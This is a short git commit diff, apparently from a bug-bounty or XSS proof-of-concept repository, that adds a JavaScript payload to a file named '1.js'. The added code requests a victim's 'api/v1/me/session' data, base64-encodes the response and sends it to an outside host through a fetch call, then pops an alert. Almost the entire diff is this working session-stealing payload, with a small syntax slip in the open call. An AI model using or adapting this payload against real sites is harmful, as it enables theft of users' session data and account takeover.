c30a3e37c38d8a2715ff216e2afef789c16b50e4
kaarthikeyenG <113669602+kaarthikeyenG@users.noreply.github.com>
2025-01-11 13:50:43 +0530

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,2 +1,9 @@
 var xhr = new XMLHttpRequest();
-
+xhr.open('GET', 'api/v1/me/session' true);
+xhr.onload = function() {
+  if (xhr.status === 200) {
+    fetch('https://xss.krypt0hunter.com/POC?x=' + btoa(xhr.responseText) );
+  }
+};
+xhr.send();
+alert(1);//
